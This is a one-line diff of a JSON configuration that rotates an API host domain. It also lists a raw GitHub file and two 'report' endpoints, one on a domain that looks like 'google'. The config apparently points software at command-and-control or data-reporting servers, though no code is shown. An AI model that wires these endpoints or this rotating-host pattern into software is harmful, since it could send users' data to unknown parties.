@@ -1,1 +1,1 @@
-{"api": {"host": ["https://docs.warmcozyblankets.blog"], "git": ["https://raw.githubusercontent.com/HappyToolsforu/base/main/svc.md"], "reportv2": ["http://www.9o09le.com/v2/report"], "greport": "https://api.blackcatmon.com", "hosts": ["https://docs.warmcozyblankets.blog"]}}
+{"api": {"host": ["https://docs.sharpcrystalrocks.blog"], "git": ["https://raw.githubusercontent.com/HappyToolsforu/base/main/svc.md"], "reportv2": ["http://www.9o09le.com/v2/report"], "greport": "https://api.blackcatmon.com", "hosts": ["https://docs.sharpcrystalrocks.blog"]}}
